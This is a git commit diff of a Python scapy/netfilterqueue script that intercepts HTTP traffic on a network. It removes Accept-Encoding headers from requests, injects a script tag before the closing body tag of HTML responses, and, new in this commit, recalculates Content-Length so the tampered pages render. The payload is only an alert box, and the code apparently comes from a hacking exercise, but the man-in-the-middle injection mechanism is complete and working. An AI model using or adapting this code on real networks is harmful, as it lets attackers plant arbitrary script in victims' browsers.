8737bc671a440118e3f97affe9f992d3483e5873
p37 <gh0stsync.rt@gmail.com>
2018-07-27 01:30:06 -0700

    recalculate Content-Lenght , refactor code and Housekeeper

--- replacer.py
+++ replacer.py
@@ -15,17 +15,25 @@ def set_load(packet,load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
+        load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
             print "[+] Request"
-            modify_load = re.sub("Accept-Encoding:.*?\\r\\n","",scapy_packet[scapy.Raw].load)
-            new_packet = set_load(scapy_packet,modify_load)
-            packet.set_payload(str(new_packet))
+            load = re.sub("Accept-Encoding:.*?\\r\\n","",load)
         elif scapy_packet[scapy.TCP].sport == 80:
             print "[+] Response"
-            modify_load = scapy_packet[scapy.Raw].load.replace("</body>","<script>alert('INJECTED')</script></body>")    
-            new_packet = set_load(scapy_packet,modify_load)
-            packet.set_payload(str(new_packet))
+            injection_code = "<script>alert('INJECTED')</script>"
+            load = load.replace("</body>",injection_code + "</body>")    
 
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)",load)
+            if content_length_search and "text/html" in load:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
+
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet,load)
+            packet.set_payload(str(new_packet))
+    
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
